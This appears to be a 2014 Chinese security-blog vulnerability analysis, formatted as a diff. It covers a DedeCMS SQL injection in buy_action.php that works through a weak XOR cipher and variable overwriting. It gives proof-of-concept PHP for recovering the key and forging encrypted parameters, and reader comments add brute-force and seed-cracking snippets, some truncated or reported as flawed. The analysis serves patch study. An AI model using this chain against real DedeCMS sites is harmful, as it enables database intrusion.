@@ -1,0 +1,86 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">DedeCMS最新通杀注入(buy_action.php)漏洞分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">360网站安全中心</a> <span class="bull">·</span> <time title="2014/02/28 12:04" ui-time="" datetime="2014/02/28 12:04" class="published ng-binding ng-isolate-scope">2014/02/28 12:04</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 前言</h2><hr><p>前两天，乌云白帽子提交了两个DedeCMS的通杀注入漏洞，闹得沸沸扬扬，25号织梦官方发布了补丁，于是就下载最新代码回来做了对比，这里简单的分析下其中的一个注入。</p><h2>0x01 漏洞分析</h2><hr><p>对比补丁后发现，25号发布的源码修改了5个文件，其中的/member/buy_action.php文件补丁对比如图1。</p><p><img alt="enter image description here" img-src="4f06bfd39fd6982012c88ac42a26c209d727b7cb.jpg"></p><p>很明显mchStrCode函数加强了加密强度，补丁前是简单的异或算法，但是织梦25号发布的补丁旨在修复乌云提交的两个注入，这个函数可能有猫腻，搜索调用该函数的文件，如图2。</p><p><img alt="enter image description here" img-src="0361b41db26d5128c0739142a8ad0ee569fce721.jpg"></p><p>接着看到/member/buy_action.php的22 - 40行代码：</p><pre><code>#!php
+if(isset($pd_encode) &amp;&amp; isset($pd_verify) &amp;&amp; md5("payment".$pd_encode.$cfg_cookie_encode) == $pd_verify)
+{
+    parse_str(mchStrCode($pd_encode,'DECODE'),$mch_Post);
+    foreach($mch_Post as $k =&gt; $v) $$k = $v;
+    $row  = $dsql-&gt;GetOne("SELECT * FROM #@__member_operation WHERE mid='$mid' And sta=0 AND product='$product'");
+    if(!isset($row['buyid']))
+    {
+        ShowMsg("请不要重复提交表单!", 'javascript:;');
+        exit();
+    }
+    if(!isset($paytype))
+    {
+        ShowMsg("请选择支付方式!", 'javascript:;');
+        exit(); 
+    }
+    $buyid = $row['buyid'];
+
+}else{
+</code></pre><p>注意其中的这两行代码：</p><pre><code>#!php
+parse_str(mchStrCode($pd_encode,'DECODE'),$mch_Post);
+    foreach($mch_Post as $k =&gt; $v) $$k = $v;
+</code></pre><p>调用了mchStrCode函数对$pd&#95;encode变量解密并通过parse&#95;str函数注册变量，紧接着foreach遍历$mch&#95;Post数组，这里如果我们可以控制$pd&#95;encode解码后的内容，就可以注册覆盖任意变量。回过头来看mchStrCode函数的代码：</p><pre><code>#!php
+function mchStrCode($string,$action='ENCODE')
+{
+    $key    = substr(md5($_SERVER["HTTP_USER_AGENT"].$GLOBALS['cfg_cookie_encode']),8,18);
+    $string    = $action == 'ENCODE' ? $string : base64_decode($string);
+    $len    = strlen($key);
+    $code    = '';
+    for($i=0; $i&lt;strlen($string); $i++)
+    {
+        $k        = $i % $len;
+        $code  .= $string[$i] ^ $key[$k];
+    }
+    $code = $action == 'DECODE' ? $code : base64_encode($code);
+    return $code;
+}
+</code></pre><p>看到mchStrCode函数中的这句代码：</p><pre><code>#!php
+$key = substr(md5($_SERVER["HTTP_USER_AGENT"].$GLOBALS['cfg_cookie_encode']),8,18);
+</code></pre><p><code>$_SERVER["HTTP_USER_AGENT"]+$GLOBALS['cfg_cookie_encode']</code>经过md5取18位字符，其中的<code>$_SERVER["HTTP_USER_AGENT"]</code>是浏览器的USER_AGENT，我们可控，关键是这个<code>$GLOBALS['cfg_cookie_encode']</code>的来源，我们继续对比补丁，如图3。</p><p><img alt="enter image description here" img-src="3a4f3b595dc5ac4dd90a54e46c20a45793d973eb.jpg"></p><p>其中/install/index.php的$rnd&#95;cookieEncode字符串的生成同样是加强了强度，$rnd&#95;cookieEncode字符串最终也就是前面提到的<code>$GLOBALS['cfg_cookie_encode']</code>，我们看看补丁前的代码：</p><pre><code>#!php
+$rnd_cookieEncode = chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('a'),ord('z'))).chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('a'),ord('z'))).mt_rand(1000,9999).chr(mt_rand(ord('A'),ord('Z')));
+</code></pre><p>这段代码生成的加密密匙很有规律，所有密匙数为26^6*(9999-1000)=2779933068224,把所有可能的组合生成字典，用passwordpro暴力跑MD5或者使用GPU来破解，破解出md5过的密匙也花不了多少时间。 分析到此，现在的关键是如何得到经过MD5加密后的18位长度密匙。前面说过，mchStrCode函数使用简单的异或算法，假设有明文A，密匙B，密文C,则：</p><pre><code>C = A ^ B
+B = A ^ C
+</code></pre><p>也就是说ABC只要只其二就可以推导出剩下的一个了。怎么得到明文以及加密后的字符串呢？看到/member/buy_action.php的112 - 114行代码：</p><pre><code>#!php
+$pr_encode = '';
+    foreach($_REQUEST as $key =&gt; $val)
+    {
+        $pr_encode .= $pr_encode ? "&amp;$key=$val" : "$key=$val";
+    }
+
+    $pr_encode = str_replace('=', '', mchStrCode($pr_encode));
+
+    $pr_verify = md5("payment".$pr_encode.$cfg_cookie_encode);
+
+    $tpl = new DedeTemplate();
+    $tpl-&gt;LoadTemplate(DEDEMEMBER.'/templets/buy_action_payment.htm');
+    $tpl-&gt;Display();
+</code></pre><p>注意到$pr&#95;encode是从$&#95;REQUEST获取的，也就是说明文可控，同时$pr_encode加密后写到html页面，如图4。</p><p><img alt="enter image description here" img-src="55a15a2266e59a76180a5bcf16001e942842d556.jpg"></p><h2>0x02 漏洞测试</h2><hr><p>下面来测试，这里需要用到firefox的一个插件User Agent Switcher来设置UA,安装插件后，添加一个UA头，其中的User Agent清空，description随便填。确认保存并使用插件将浏览器的UA设置刚刚添加的UA头，即为空。如图5。</p><p><img alt="enter image description here" img-src="b5b8f2b1f130c610be2e3bbe3c7f17a079818c33.jpg"></p><p>设置为空是因为mchStrCode函数中的密匙含<code>$_SERVER["HTTP_USER_AGENT"]</code>，如果不为空将加大md5的破解难度，设置为空则密匙为固定10位长度。设置好UA后，注册并登陆会员中心，在“我的织梦”->“消费中心”->“会员升级/点卡充值”中的“购买新点卡”选择“100点卡”，在点击购买前使用Live HTTP header监听，抓到的数据包如图6。</p><p><img alt="enter image description here" img-src="0e88e18fe8b9165351cf65d9df6fadb102206817.jpg"></p><p>因为$&#95;REQUEST获取参数是从$&#95;GET->$&#95;POST->$&#95;COOKIE依次获取，所以$pr_encode明文的的内容为POST的内容“product=card&amp;pid=1”加上COOKIE的内容，然后加密并打印加密后的字符串到html页面。同时“product=card&amp;pid=1”刚好18个字符长度，对应密匙长度。点击购买后支付方式选支付宝，再次使用使用Live HTTP header监听，点击购买并支付提交，抓到的数据包如图7。</p><p><img alt="enter image description here" img-src="51fa57c76cfa86200db292ba79f04436b2635500.jpg"></p><p>将pd_encode=后面的字符串复制下来，利用下面的代码逆出MD5加密后的key：</p><pre><code>#!php
+&lt;?php
+$key = "product=card&amp;pid=1";
+$string = "QEJXUxNTQwlVABcGF0QMVAwFFmBwZzV1ZGd%2FJVhQQAIXWAMCBEZeBwAAUVJTAgoNA0BTBgdWBhZ8UgJVYkdTEywmDAxDdFRQVWVLUhR5c2tpAg4vVQFYVFQHBAVZUV5VBVEGAFdQBRIhVVVRfF9fXghkXllTXFRRCAdRAAUDBQUecwNUUnhZBgwMZV0IVW5rU1t1U1MNVVIOWFFRA1UEAwcEUQZaBUB1eWJpJiogcHcub2RmfA0XUwNUUldbEkoPVFkHVUMbX0BdRQdEXltYTxUKQQ";//加密的pd_encode字符串，需要修改
+$string = base64_decode(urldecode($string));
+for($i=0; $i&lt;strlen($string); $i++)
+{
+        $code  .= $string[$i] ^ $key[$i];
+}
+echo "md5(\$key):" .$code;
+?&gt;
+</code></pre><p><img alt="enter image description here" img-src="767dc4dfb26e7447c33a4fa74ec350deccbbd618.jpg"></p><p>如图8。取逆出的key的前16位破解md5即可，破解出密匙后就可以利用mchStrCode函数来加密参数，同时利用变量覆盖漏洞覆盖$GLOBALS[cfg_dbprefix]实现注入。这里给出一段POC，代码如下：</p><pre><code>#!php
+&lt;?php
+$GLOBALS['cfg_cookie_encode'] = 'CaQIm1790O';
+function mchStrCode($string,$action='ENCODE')
+{
+    $key    = substr(md5($GLOBALS['cfg_cookie_encode']),8,18);
+    $string    = $action == 'ENCODE' ? $string : base64_decode($string);
+    $len    = strlen($key);
+    $code    = '';
+    for($i=0; $i&lt;strlen($string); $i++)
+    {
+        $k        = $i % $len;
+        $code  .= $string[$i] ^ $key[$k];
+    }
+    $code = $action == 'DECODE' ? $code : base64_encode($code);
+    return $code;
+}
+</code></pre><p>其中的CaQIm1790O就是解密出来的密匙，漏洞分析到处结束，感觉像是在记流水账，将就看看吧，最后上个本地测试EXP的图。如图9。</p><p><img alt="enter image description here" img-src="621b417f9f8ddb2f77e5c9d8b79b0b63a614e33d.jpg"></p><h2>0x03 总结</h2><hr><p>写到这里就算结束了，最后做个总结，漏洞由mchStrCode函数弱算法->导致通过获取到的明文和密文可以逆出经过MD5加密的密匙->破解MD5得到密匙->利用密匙加密数据->经过parse&#95;str函数和foreach遍历最终覆盖表前缀变量$GLOBALS[cfg&#95;dbprefix]实现注入，这样的漏洞并不多见，但危害很大，WAF等防火墙很难防御，漏洞利用过程提交的数据因为加密，面目全非,和正常用户操作提交的数据并无二致。</p><p>附：官方补丁地址：<a href="http://www.dedecms.com/pl/">http://www.dedecms.com/pl/</a></p><p>原文链接：<a href="http://loudong.360.cn/blog/view/id/16">http://loudong.360.cn/blog/view/id/16</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/2609" rel="bookmark" id="re1">异或加密之美 #主流web弱算法科普文</a></li><li><a href="http://drops.wooyun.org/papers/11371" rel="bookmark" id="re2">Joomla 对象注入漏洞分析报告</a></li><li><a href="http://drops.wooyun.org/papers/660" rel="bookmark" id="re3">php4fun.sinaapp.com PHP挑战通关攻略</a></li><li><a href="http://drops.wooyun.org/papers/11330" rel="bookmark" id="re4">Joomla远程代码执行漏洞分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nimda</span> <span class="reply-time">2014-08-14 16:03:37</span></div><p></p><p>Wooyun敢添加个放大图片功能不 - -，最上面的几个小图看着累啊。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">′ 雨。</span> <span class="reply-time">2014-07-13 18:58:12</span></div><p></p><p>+1</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fyth</span> <span class="reply-time">2014-03-30 22:14:29</span></div><p></p><p>= =脑残了，忘了verify了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fyth</span> <span class="reply-time">2014-03-30 22:10:38</span></div><p></p><p>key用到的是md5之后的，解出来明文没啥意义。直接异或出来key就行了吧。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">marry</span> <span class="reply-time">2014-03-24 15:35:58</span></div><p></p><p>同时“product=card&amp;pid=1”刚好18个字符长度，对应密匙长度 不对吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">炯炯虾</span> <span class="reply-time">2014-03-06 14:57:12</span></div><p></p><p>20秒破mt_rand( ) seed http://www.openwall.com/php_mt_seed/README</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">七叶</span> <span class="reply-time">2014-03-05 09:50:07</span></div><p></p><p>那伪随机数的逆向破解问题怎么解决呢？<br>根据我的分析，这个poc的关键问题应该在这，实际上原本程序也就是认为这个"伪随机"能够保证不被破解，才敢"信任"来自用户的数据<br>现在这个信任关系被打破了，但是问题在于，有什么好的办法能快速逆向出这个key的明文值呢？<br>mt_rand()的种子key的明文空间太大了，我没有想到好的密码学对抗方法</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-03-04 15:44:26</span></div><p></p><p>小伙伴，下次麻烦也发个diff到drops……:)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">My5t3ry</span> <span class="reply-time">2014-03-03 23:15:57</span></div><p></p><p>好认真啊，http://loudong.360.cn/blog/view/id/16 这里更新了代码，编辑器问题导致代码没贴全</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">七叶</span> <span class="reply-time">2014-03-03 17:17:46</span></div><p></p><p>......不知道为啥，乌云过滤了"&lt;&quot;。for后面的内容都发不出来..<br>//LZ貌似漏了这个吧？<br>$k = $i % $len;<br>$code .= $string[$k] ^ $key[$k];</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">七叶</span> <span class="reply-time">2014-03-03 17:16:36</span></div><p></p><p>&lt;?php<br>//这是用户输入的订单数据，可能pid每次会不一样<br>$key = &quot;product=card&amp;pid=1&quot;;<br>//这是服务端返回的加密后的订单数据，每次可能会不一样<br>$string = &quot;QEJXUxNTQwlVABcGF0QMVAwFFmBwZzV1ZGd%2FJVhQQAIXWAMCBEZeBwAAUVJTAgoNA0BTBgdWBhZ8UgJVYkdTEywmDAxDdFRQVWVLUhR5c2tpAg4vVQFYVFQHBAVZUV5VBVEGAFdQBRIhVVVRfF9fXghkXllTXFRRCAdRAAUDBQUecwNUUnhZBgwMZV0IVW5rU1t1U1MNVVIOWFFRA1UEAwcEUQZaBUB1eWJpJiogcHcub2RmfA0XUwNUUldbEkoPVFkHVUMbX0BdRQdEXltYTxUKQQ&quot;;//加密的pd_encode字符串，需要修改<br>$string = base64_decode(urldecode($string));<br>$len = strlen($key);<br>for($i=0; $i</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">七叶</span> <span class="reply-time">2014-03-03 17:13:02</span></div><p></p><p>好文，跟着LZ一起分析完了，很淫荡的漏洞<br>有亮点想说一下:<br>1. 获取md5($key)的poc好像有点问题<br>&lt;?php<br>//这是用户输入的订单数据，可能pid每次会不一样<br>$key = &quot;product=card&amp;pid=1&quot;;<br>//这是服务端返回的加密后的订单数据，每次可能会不一样<br>$string = &quot;QEJXUxNTQwlVABcGF0QMVAwFFmBwZzV1ZGd%2FJVhQQAIXWAMCBEZeBwAAUVJTAgoNA0BTBgdWBhZ8UgJVYkdTEywmDAxDdFRQVWVLUhR5c2tpAg4vVQFYVFQHBAVZUV5VBVEGAFdQBRIhVVVRfF9fXghkXllTXFRRCAdRAAUDBQUecwNUUnhZBgwMZV0IVW5rU1t1U1MNVVIOWFFRA1UEAwcEUQZaBUB1eWJpJiogcHcub2RmfA0XUwNUUldbEkoPVFkHVUMbX0BdRQdEXltYTxUKQQ&quot;;//加密的pd_encode字符串，需要修改<br>$string = base64_decode(urldecode($string));<br>$len = strlen($key);<br>for($i=0; $i</p><p>2. 文章中有一个关键点没有详说，得到md5($key)后该怎么逆向破解出$key呢？这个是"强随即(相对的)"字符串哦！cmd5.com应该是查不出来的，要做到批量poc的可用程序，必须还得有以一种稳定可靠的逆向破解方法<br>我想了2个思路：<br>1) 纯暴力穷举<br>$cipger = "96fbe6041f06dc217b";</p><p>for ($i=ord('A'); $i &lt;= ord(&#039;Z&#039;); $i++)<br>{<br>for ($j=ord(&#039;a&#039;); $j &lt;= ord(&#039;z&#039;); $j++)<br>{<br>for ($k=ord(&#039;A&#039;); $k &lt;= ord(&#039;Z&#039;) ; $k++)<br>{<br>for ($l=ord(&#039;A&#039;); $l &lt;= ord(&#039;Z&#039;) ; $l++)<br>{<br>for ($m=ord(&#039;a&#039;); $m &lt;= ord(&#039;z&#039;); $m++)<br>{<br>for ($o=1000; $o &lt;= 9999; $o++)<br>{<br>for ($p=ord(&#039;A&#039;); $p &lt;= ord(&#039;z&#039;); $p++)<br>{<br>$rnd_cookieEncode = chr($i) . chr($j) . chr($k) . chr($l) . chr($m) . $o . chr($p);<br>if(substr(md5($cfg_cookie_encode), 8, 18) == $cipger)<br>{<br>die(var_dump($cfg_cookie_encode));<br>}<br>}<br>}<br>}<br>}<br>}<br>}<br>}<br>很蛋疼，你懂的，我的联想G470都跑烧了都没跑出来</p><p>2) PHP的伪随机数问题<br>&lt;?php<br>if($seed = get_seed())<br>{<br>echo &quot;seed is: &quot; . $seed . &quot;\n&quot;;<br>mt_srand($seed);<br>echo &quot;key is: &quot; . chr(mt_rand(ord(&#039;A&#039;),ord(&#039;Z&#039;))).chr(mt_rand(ord(&#039;a&#039;),ord(&#039;z&#039;))).chr(mt_rand(ord(&#039;A&#039;),ord(&#039;Z&#039;))).chr(mt_rand(ord(&#039;A&#039;),ord(&#039;Z&#039;))).chr(mt_rand(ord(&#039;a&#039;),ord(&#039;z&#039;))).mt_rand(1000,9999).chr(mt_rand(ord(&#039;A&#039;),ord(&#039;Z&#039;)));<br>}</p><p>//逆向算法的逻辑，猜解出种子值<br>function get_seed()<br>{<br>for($i = 0; $i</p><p>这两种是我目前想到的，可是效果还是不太好，我可怜的G470..一直在呻吟</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">七叶</span> <span class="reply-time">2014-02-28 17:48:18</span></div><p></p><p>怎么有种似曾相似的感觉<br>DZ也有一个类似利用思想的漏洞<br>http://www.freebuf.com/articles/web/12088.html</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mango</span> <span class="reply-time">2014-02-28 14:13:18</span></div><p></p><p>沙发。。。我不做黑产</p><p></p></div></div></div></div></div></main>
